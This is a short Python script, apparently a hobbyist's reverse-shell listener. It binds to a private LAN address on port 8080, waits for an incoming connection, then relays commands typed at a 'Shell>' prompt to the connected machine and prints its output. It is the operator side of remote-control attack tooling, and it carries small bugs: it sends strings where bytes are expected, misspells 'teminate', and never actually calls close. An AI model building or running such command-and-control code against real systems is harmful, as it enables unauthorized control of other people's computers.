import socket

def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    IP='192.168.0.59'
    s.bind((IP,8080))
    s.listen(1)

    print("[+] Listening for incoming TCP")

    conn,addr=s.accept()
    print("[+] We got a connection from",addr)

    while True:
        command=input("Shell>")

        if 'terminate' in command:
            conn.send('teminate')
            conn.close
            break

        else:
            conn.send(command)
            print(conn.recv(1024))

connect()